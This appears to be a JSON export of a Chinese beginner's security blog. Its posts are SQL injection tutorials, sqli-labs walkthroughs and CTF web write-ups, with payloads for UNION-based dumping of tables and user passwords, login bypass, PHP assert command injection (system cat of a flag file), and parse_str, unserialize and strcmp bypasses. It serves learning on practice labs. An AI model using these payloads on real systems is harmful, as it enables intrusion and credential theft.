1.两个极限条件 12where 1 &#x3D; 1where 1 &#x3D; 2 自我感觉一般用来完善sql语法补齐引号2.字符串条件的表达就像我们爆表的那个常用语句 1?id&#x3D;0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() 先说明一下table_schema 的意思是数据库名database()是返回当前的数据库名因此此处的where意思是指：查询的范围被限定在了此数据库中，即起到约束作用3.模糊查询格式为：like（像）+ 通配符 （1） “%”为通配符，代表0 - n个任意字符 （1）“-”代表一个任意字符例如： 1SELECT * FROM news WHERE keyword like &#39;%$keyword%&#39; 意思就是此查询news中所有的含有我们所输入的$keyword的字符串（暂且先这样说） 1where name like ‘_$keyword%’ 这个就是查询中间为我们所输入的字符串@当我们要查询例如’$keyword_’时，我们要进行转义即使用\\ 1where name like &#39;$keyword\\_%&#39; 4.还有使用一些条件链接符号进行限制条件","categories":[],"tags":[]},{"title":"sql注注入类型解释","slug":"sql注注入类型解释","date":"2019-12-16T02:37:33.932Z","updated":"2019-12-29T02:31:33.351Z","comments":true,"path":"2019/12/16/sql注注入类型解释/","link":"","permalink":"http://summern.club/2019/12/16/sql%E6%B3%A8%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%A7%A3%E9%87%8A/","excerpt":"sql注入类型简单记录","text":"sql注入类型简单记录 sql注入类型简单记录1.sql注入流程（1）判断注入点（2）判断注入类型（3）判断数据库类型（3）获得数据库数据，提权一、判断注入点 所有的输入只要和数据库进行交互的，都有可能触发SQL注入一般有三类Get参数触发SQL注入POST参数触发SQL注入Cookie触发SQL注入 1234一般我们输入&#39;来判断 是否存在注入点如果页面返回错误，则存在 Sql 注入原因是：原因是无论字符型还是整型都会因为单引号个数不匹配而报错。 二、判断注入类型我们来了解一下：有以下几种注入类型：（1）数字型注入点（2）字符型注入点（3）搜索型注入点（4）内嵌式sql注入（5）终止试sql注入之后我们进行解释：1.数字型注入点测试方法： 1234http:&#x2F;&#x2F;host&#x2F;test.php?id&#x3D;100 and 1&#x3D;1 返回成功http:&#x2F;&#x2F;host&#x2F;test.php?id&#x3D;100 and 1&#x3D;2 返回失败 为什么呢 假设我们网站的SQL查询的语句是这样的SELECT * FROM news WHERE id=$id那么这个$id 即为用户提交的 当我们输入的是100 and 1=1语句就变成了这样SELECT * FROM news WHERE id=100 and 1=1对于and 12345这个SQL语句and左边是返回成功的，因为我们是在有这个id的情况下后面加上我们的注入语句，如果这个id不存在，那就没法测试了而在and右边，1&#x3D;1也是恒成立的，所以整个语句返回的是成功当然，如果后面改成了1&#x3D;2的话，因为1&#x3D;2是不成立的，and语句的判断逻辑是只要有一个不成立，就返回失败，所以1&#x3D;2最后会返回的是失败 因此我们可以这样进行判断2.字符型注入点测试方法： http://host/test.php?name=man&#39; and ‘1’=’1 返回成功 http://host/test.php?name=man&#39; and ‘1’=’2返回失败 这里就使上面的数字型变为了字符型 原因如下： 还是假设我们网站的SQL语句是这样的 SELECT * FROM news WHERE name=&apos;$name&apos; 当我们构造输入为下面这个的时候 man&apos; and &apos;1&apos;=&apos;1 语句就变成了 SELECT * FROM news WHERE name=&apos;man&apos; and &apos;1&apos;=&apos;1&apos;发现什么了没？这个SQL已经闭合了 还是一样的，这里and的左边是一定成立的，而and右边也是一样的成立，所以and逻辑之后，整个语句返回成功 同理可知如果后面是1&apos;=&apos;2就会返回失败，当然，这里不一定非要是1或者2，因为是字符型，所以我们可以输入任何字符比如这样 http://host/test.php?name=man&apos; and &apos;a&apos;=&apos;a 返回成功 http://host/test.php?name=man&apos; and &apos;a&apos;=&apos;b返回失败 3.搜索式sql注入 测试方法 http://host//test.php?keyword=python%&#39; and 1=1 and ‘%’=’ http://host//test.php?keyword=python%&#39; and 1=2 and ‘%’=’ 假设我们的SQL查询语句是这样的 SELECT * FROM news WHERE keyword like &apos;%$keyword%&apos; 这里的$keyword是用户的输入 当我们输入以下语句的时候 pt%&apos; and 1=1 and &apos;%&apos;=&apos; 最终我们得到的语句是这样的 SELECT * FROM news WHERE keyword like &apos;%pt%&apos; and 1=1 and &apos;%&apos;=&apos;%&apos; 这个语句又一次的闭合了这里我们再分析以下，因为是and逻辑，只要有一个错误，就返回错误 我们可以把这个语句分为三段 SELECT * FROM news WHERE keyword like &apos;%python%&apos; and 1=1 and &apos;%&apos;=&apos;%&apos; 第一行的语句肯定是成功（再强调一遍，我们要在存在的查询上构造SQL注入） 第二句也是，第三句也是，因为自己肯定等于自己啊 但是如果我们把第二句换成1=2，那么这个语句肯定就会返回失败了，就是这个原理4.内嵌式sql注入内联注入是指查询注入SQL代码后，原来的查询仍然全部执行 假设我们的网站SQL查询语句是这样的 SELECT * FROM admin WHER username=’$name’ AND password =’$passwd’ 这一看就是个登录页面的代码 假如我们构造如下语句提交到登录框中的username &apos; or &apos;&apos;=&apos; 或者提交到password框里面，这两种提交方法是不一样的，我们下面就来分析一下这两个提交方法 提交到username我们的语句就会成为这样 SELECT * FROM admin WHER username=&apos;&apos; or &apos;&apos;=&apos;&apos; AND password =&apos;fuzz&apos;fuzz是我们随便输入的字符串 而提交到password则会是这样的 SELECT * FROM admin WHER username=&apos;fuzz&apos; AND password =&apos;&apos; or &apos;&apos;=&apos;&apos;注: 在SQL语句中，AND的优先级是大于OR的 先计算AND，然后计算OR，所以这里我们的语句会被OR分为两段SQL语句 这是username框的 SELECT * FROM admin WHER username=&apos;&apos; or &apos;&apos;=&apos;&apos; AND password =&apos;fuzz&apos;或者password框的是这样 SELECT * FROM admin WHER username=&apos;fuzz&apos; AND password =&apos;&apos; or &apos;&apos;=&apos;&apos;我们首先用第一个来分析 首先计算AND之后 SELECT * FROM admin WHER username=&apos;&apos;返回失败 or &apos;&apos;=&apos;&apos; AND password =&apos;fuzz&apos;返回失败数据库是不会存在username为NULL的字段的，所以第一句返回的是失败，第三句中，因为password是我们随便输入的，99.99%是不会存在这个密码的，于是AND之后，我们的第三句也是失败的，所以整个语句返回失败的 但是我们的password情况就不一样了 SELECT * FROM admin WHER username=&apos;fuzz&apos; AND password =&apos;&apos; or &apos;&apos;=&apos;&apos;这里我们第一句是返回失败的，但是我们的第二句’’=’’是返回成功的，OR逻辑是有一个是成功就返回成功，于是我们的整个语句就会返回成功 返回成功之后我们就会绕过登录表单直接登录系统了5.终止式sql注入终止式SQL语句注入是指攻击者在注入SQL代码时，通过注释剩下的查询来成功结束该语句 于是被注释的查询不会被执行，我们还是拿上面那个例子举例 我们上面已经知道，在username框内填入 &apos; or &apos;&apos;=&apos; 程序是不会返回成功的，我们就没有办法在username做文章了吗？错了，我们还有终止式 还是上面那个SQL查询语句 SELECT * FROM admin WHER username=’$name’ AND password =’$passwd’ 这里我们构造如下username输入 &apos; or &apos;&apos;=&apos;&apos; --之后我们就可以得到如下的查询语句 SELECT * FROM admin WHER username=&apos;&apos; or &apos;&apos;=&apos;&apos; --&apos; AND password =&apos;fuzz&apos;这里的fuzz是我们随便输入的，–是注释符 这样，我们的语句就可以分为三个部分了 SELECT * FROM admin WHER username=&apos;&apos; or &apos;&apos;=&apos;&apos; 返回成功 --&apos; AND password =&apos;fuzz&apos;第一句肯定是返回失败的，但是我们第二句会返回成功 后面已经被我们注释掉了，是不会执行的，所以我们还是可以通过在username做这个手脚来绕过登录 下面是我们常见的一些终止方式终止字符串： – ， #， %23， %00， /*终止方法： – , ‘– , ‘)– , ) – , ‘)) –, ))–","categories":[],"tags":[]},{"title":"sqli-lab 学习记录less2","slug":"sqli-lab 学习记录less2","date":"2019-12-16T02:37:33.932Z","updated":"2019-12-29T02:31:56.348Z","comments":true,"path":"2019/12/16/sqli-lab 学习记录less2/","link":"","permalink":"http://summern.club/2019/12/16/sqli-lab%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95less2/","excerpt":"sqli-lab 学习记录less2","text":"sqli-lab 学习记录less2 less21.我们先来判断这次的sql注入类型我们输入 12?id&#x3D;1?id&#x3D;1&#39; 发现第一个语句返回正确但是第二个却有了报错我们因此可以判断这次的sql注入类型为数字类型 2.之后和less1一样我们进行暴表的名字（暴表）我们输入 1?id&#x3D;0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() 我们由此得到3.我们之后开始爆列喽输入 1?id&#x3D;0 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39; 我们可以得到4.最后我们来获得我们要得到的东西输入代码 1?id&#x3D;0 union select 1,group_concat(id,username,password),3 from users 就得到了我们要得到的东西另外我们附加关于where的知识 table_schema是数据库名database()函数会返回当前的数据库名)where就是约束条件这个 where后面 就是为了约束一下 我要查询的数据库 而不是去 看其他数据库里的东西我要看的 东西 就是 当前数据库database里的 不是其他的数据里的比如 有两个数据库 数据库1 数据库2 当前的数据库database是数据库1 你可以 where table_schema=database() 或者是where table_schema=’数据库1’","categories":[],"tags":[]},{"title":"sqli-lab 学习记录 less3-less4","slug":"sqli-lab 学习记录 less3-less4","date":"2019-12-16T02:37:33.917Z","updated":"2019-12-29T02:31:44.084Z","comments":true,"path":"2019/12/16/sqli-lab 学习记录 less3-less4/","link":"","permalink":"http://summern.club/2019/12/16/sqli-lab%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%20less3-less4/","excerpt":"sqli-lab 学习记录 less3-less4","text":"sqli-lab 学习记录 less3-less4 less3:进入界面我们先进行判断注入的类型我们输入 1?id&#x3D;1 有正常回显之后我们在输入 1234?id&#x3D;1&#39;发现出现了：![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20190319192230358.png)根据后面的报错我们可以大致的判断此sql语句是这样的： 1SELECT * FROM users WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1&quot; 之后呢，我们来验证我们的判断我们输入 1?id&#x3D;1&#39;) %23 得到正常回显因此我们就确定了注入类型之后的步骤就和我们之前做less1与2一样了这里就不过多解释了 less4我们还是一样判断注入类型(这个类型与less3相似，但是爆出错误却很难)我刚开始输入了 123?id&#x3D;1?id&#x3D;1&#39;?id&#x3D;1 and 1&#x3D;2 均有回响弄得我一脸懵逼之后尝试使用 1?id&#x3D;1&quot; 终于爆出了错误从错误中我们大致可以判断应该是类似于（“ $id ”）我们可以构造 1?id&#x3D;1&quot;) %23 得到正常回显之后我们的步骤和之前一样就可以了 萌新文章，还请大佬们指导邮箱：497710073@qq.com","categories":[],"tags":[]},{"title":"sqli-lab less1","slug":"sqli-lab less1","date":"2019-12-16T02:37:33.901Z","updated":"2019-12-29T02:32:01.867Z","comments":true,"path":"2019/12/16/sqli-lab less1/","link":"","permalink":"http://summern.club/2019/12/16/sqli-lab%20less1/","excerpt":"sqli-lab 学习记录","text":"sqli-lab 学习记录 Less 11，我们先要爆出他的字段数，即列的数目插入知识：information_schema数据库是MySQL系统自带的数据库，它提供了数据库元数据的访问方式。感觉information_schema就像是MySQL实例的一个百科全书，记录了数据库当中大部分我们需要了结的信息，比如字符集，权限相关，数据库实体对象信息，外检约束，分区，压缩表，表信息，索引信息，参数，优化，锁和事物等等。数据库拥有一个名为tables的数据表，该表包含两个字段table_name和table_schema,分别记录DBMS中的存储的表名和表名所在的数据库。 ’ or 1=1 –+ （–后要加空格才能注释，但是在网址栏输入时最后加空格解析时会被去掉，所以用+，当然用%20也行）’ or 1=1 # （火狐下在url栏用#注释会报错，改成url编码%23即可）我们使用如下代码 123?id&#x3D;1&#39; order by 1 %23?id&#x3D;1&#39; order by 2 %23?id&#x3D;1&#39; order by 3 %23 当我们进行到order by 4 %23时，我们发现报错，所以我们判断有三列对了，要判断注入点输入 1?id&#x3D;1&#39; 会报错显示所以差不多我们输入的就放在了这对引号内ok2.之后我们进行爆表 1?id&#x3D;0&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() %23 得到了我们判断用户名在users中之后爆列喽附加一些资料) 1?id&#x3D;0&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39; %23 得到：之后我们再得到我们需要的内容 1http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;0&#39; union select 1,group_concat(id,username,password),3 from users %23 最后我们就得到了我们想要的：累死了，，，加油吧","categories":[],"tags":[]},{"title":"python将时间戳转化为时间","slug":"python将时间戳转化为时间","date":"2019-12-16T02:37:33.885Z","updated":"2019-12-29T02:31:08.344Z","comments":true,"path":"2019/12/16/python将时间戳转化为时间/","link":"","permalink":"http://summern.club/2019/12/16/python%E5%B0%86%E6%97%B6%E9%97%B4%E6%88%B3%E8%BD%AC%E5%8C%96%E4%B8%BA%E6%97%B6%E9%97%B4/","excerpt":"python将时间戳转化为时间","text":"python将时间戳转化为时间 title:第一篇博客：python时间转换（将时间戳转化为时间）date: 2019-02-014 22:37:58tags: python的os.path模块中有着这样的一个函数 123os.path.getatime() #获得文件的最近访问时间os.path.getctime() #获得文件的创建时间os.path.getmtime() #获得文件的修改时间 我们就以第一个函数为例os.path.getatime()1.首先使用 1time.localtime() #将其转换为localtime的格式 2.将转化过来的时间进行格式化，使用 1time.strftime(&quot;%d:%b:%Y:%H:%M:%S&quot;,temp) #temp为转化过来的localtime格式时间 3.最后输出就行了完整的过程如下所示：` 1234567import osimport timetemp &#x3D; time.localtime(os.path.getatime(&quot;python.exe&quot;))#获取python.exe的最近访问时间，并将其localtime化temp1 &#x3D; time.strftime(&quot;(&quot;%d:%b:%Y:%H:%M:%S&quot;,temp)#将temp格式化print(temp1) （这是我第一次写博客，有啥不好的，大佬指教）邮箱：497710073@qq.com","categories":[],"tags":[]},{"title":"jarvis OJ web babyphp","slug":"jarvis OJ web babyphp","date":"2019-12-16T02:37:33.885Z","updated":"2019-12-29T02:31:06.811Z","comments":true,"path":"2019/12/16/jarvis OJ web babyphp/","link":"","permalink":"http://summern.club/2019/12/16/jarvis%20OJ%20web%20babyphp/","excerpt":"babyphp","text":"babyphp 考完二级后我又要回归web狗了今天做到一道web题上题：http://web.jarvisoj.com:32798/ 进入后：发现应该有git泄露因此我们使用githack进行获得源码 1234打开cmd输入：python2 GitHack.py http:&#x2F;&#x2F;web.jarvisoj.com:32798&#x2F;.git&#x2F;#这里的python2是我设置的用于区分python3即这个脚本要使用python2 之后我们得到源码： 当然如果我们直接在打开flag.php的话没用的，因为emmm标志被注释掉了)我们重点来看这里：assert（）函数这个我也不算太懂，但是只要是这一句话如果assertion是字符串，那么此字符串会被当做php代码执行因此我们就可以进行php注入（我的第一次php注入）我们在url后面输入 1?page&#x3D;&#39;. system(&quot;cat templates&#x2F;flag.php&quot;).&#39; 这个代码的意思是打开flag.php 所在的templates文件中的此文件为什么知道他在那里，因为有： 输入payload后我们查看源代码得到flag为什么要查看源码才能看到了，因为标志被注释了呀（源代码的那部分是绿色的）","categories":[],"tags":[]},{"title":"issctf     web1","slug":"issctf     web1","date":"2019-12-16T02:37:33.854Z","updated":"2019-12-29T02:30:29.585Z","comments":true,"path":"2019/12/16/issctf     web1/","link":"","permalink":"http://summern.club/2019/12/16/issctf%20%20%20%20%20web1/","excerpt":"标题issctf 中最简单的一个web题（耗费了我一个小时。。。。）","text":"标题issctf 中最简单的一个web题（耗费了我一个小时。。。。） 题目涉及知识点：1.php 中的几个函数（等会列举）2.php parse_str引起的变量覆盖漏洞 一、我们要了解的php函数即方法$SERVER[‘REQUEST_URI’]parse_urlparse_str二、由parse_str引起的变量覆盖漏洞parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。ok三、接下来打开题目&lt;?phperror_reporting(0);include(“flag.php”); $hashed_key = ‘ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a’; $parsed = parse_url($SERVER[‘REQUEST_URI’]);if(isset($parsed[“query”])){ $query = $parsed[“query”]; $parsed_query = parse_str($query); if($parsed_query!=NULL){ $action = $parsed_query[‘action’]; } if($action===”auth”){ $key = $_GET[“key”]; $hashed_input = hash(‘sha256’, $key); if($hashed_input!==$hashed_key){ die(““); } echo $flag; }}else{ show_source(__FILE);}?&gt; 我们只需构造一个get传入是action=auth且将hashed_key变量进行覆盖，传入你想传入的经过sha256后的值最后传入key即可样本?action=auth&amp;hashed_key=xxxxxxx&amp;key=xxx","categories":[],"tags":[]},{"title":"flag.php bugku  web","slug":"flag.php bugku  web","date":"2019-12-16T02:37:33.839Z","updated":"2019-12-29T02:30:26.206Z","comments":true,"path":"2019/12/16/flag.php bugku  web/","link":"","permalink":"http://summern.club/2019/12/16/flag.php%20bugku%20%20web/","excerpt":"bugku web flag.php","text":"bugku web flag.php 打开题目网页首先尝试了一下简单的sql注入但是没用想了一会后，发现提示hint所以我们尝试一下使用get方法传入hint任意值即?hint=1传入后发现一页代码 1234567891011121314151617181920212223242526272829303132333435 &lt;?phperror_reporting(0);include_once(&quot;flag.php&quot;);$cookie &#x3D; $_COOKIE[&#39;ISecer&#39;];if(isset($_GET[&#39;hint&#39;]))&#123; show_source(__FILE__);&#125;elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;)&#123; echo &quot;$flag&quot;;&#125;else &#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;&lt;title&gt;Login&lt;&#x2F;title&gt;&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;br&gt;&lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt; &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt; &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt; &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt; &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt; &lt;&#x2F;form&gt;&lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?php&#125;$KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;?&gt; 之后我们查看开头的代码发现要将cookie指进行序列化后使与key值相等即可得到flag但是注意：下方的key值并不是我们需要的而我们需要的key值在程序中并没有赋值因此为NULL所以有 1234&lt;?php$KEY&#x3D;&quot;&quot;;print(serialize($KEY));?&gt; 因为我们并没有对$key进行赋值因此求序列化的程序如上所示之后我们可以使用火狐上的hackbar上传cookies即ISecer=s:0:””%3b因为；无法上传 ， 因此我们使用其的url码上传注意，上传的时候要在没有get hint的页面中进行否则无法显示flag 萌新 还请大佬指教邮箱：497710073@qq.com","categories":[],"tags":[]},{"title":"extract（）变量漏洞","slug":"extract（）变量漏洞","date":"2019-12-16T02:37:33.823Z","updated":"2019-12-29T02:30:23.374Z","comments":true,"path":"2019/12/16/extract（）变量漏洞/","link":"","permalink":"http://summern.club/2019/12/16/extract%EF%BC%88%EF%BC%89%E5%8F%98%E9%87%8F%E6%BC%8F%E6%B4%9E/","excerpt":"php代码审计日志一（bugku extract变量覆盖）","text":"php代码审计日志一（bugku extract变量覆盖） 题目来源：bugku代码为：我们先了解一下extract（）函数之后我们再了解一下php中的extract（）漏洞 第一次我所构造的为：?shiyan=1&amp;flag=1但是不行我查了一些大佬的wp后发现有：之后我们就可以得到flag","categories":[],"tags":[]},{"title":"csdn_export_md","slug":"csdn_export_md","date":"2019-12-16T02:37:33.807Z","updated":"2019-12-29T02:30:20.693Z","comments":true,"path":"2019/12/16/csdn_export_md/","link":"","permalink":"http://summern.club/2019/12/16/csdn_export_md/","excerpt":"代码审计之strcmp（）漏洞","text":"代码审计之strcmp（）漏洞 先了解一下此漏洞：strcmp(str1,str2)比较两个字符串，如果相等就返回0。 在5.3版本前，如果传入的不是字符串，那么会报错，并且return 0，返回0就代表相等了。绕过strcmp就想办法传入数组吧，只需要v3[]=3即可。 之后我们通过一个题来做一个例子： 12345678910&lt;?php$flag &#x3D; &quot;flag&#123;xxxxx&#125;&quot;;if (isset($_GET[&#39;a&#39;])) &#123;if (strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0) &#x2F;&#x2F;如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。&#x2F;&#x2F;比较两个字符串（区分大小写）die(&#39;Flag: &#39;.$flag);elseprint &#39;No&#39;;&#125;?&gt; 因此我们可以构造?a[]=1即可得到flag","categories":[],"tags":[]},{"title":"bugku成绩单","slug":"bugku成绩单","date":"2019-12-16T02:37:33.714Z","updated":"2019-12-29T02:30:16.448Z","comments":true,"path":"2019/12/16/bugku成绩单/","link":"","permalink":"http://summern.club/2019/12/16/bugku%E6%88%90%E7%BB%A9%E5%8D%95/","excerpt":"bugku成绩单 详细解析","text":"bugku成绩单 详细解析 1，我们首先分别输入1,2,3，均有输出我们输入1’没有回响因此我们可以判断存在sql注入2.我们分别输入 12341&#39; order by 1#1&#39; order by 2#1&#39; order by 3#1&#39; order by 4# 均有回响但是当我们使用 11&#39; order by 5# 时，没有回响因此我们可以根据此判断字段数为43，之后就是最精彩的地方了之后我们联合查询我们先输入注意（select好像tm的不是查询，，好像是赋值。。） 11&#39; union select 1,2,3,4# 没有显示有用的东西因为id=1 所以我们的东西被覆盖因此呢我们输入 15&#39; union select 1,2,3,database()# 即设置一个新的id，我们要select的值会显示在表上（覆盖）现在我们得到了一个数据库的名字之后就进行爆表5’union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#得到之后再进行获得里面的列‘ union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=’fl4g’#得到我们得到了列之后我们获取我们要得到的东西5’ union select 1,2,3,skctf_flag from fl4g#得到flag 之后我会写一些关于sql语句的总结","categories":[],"tags":[]}]}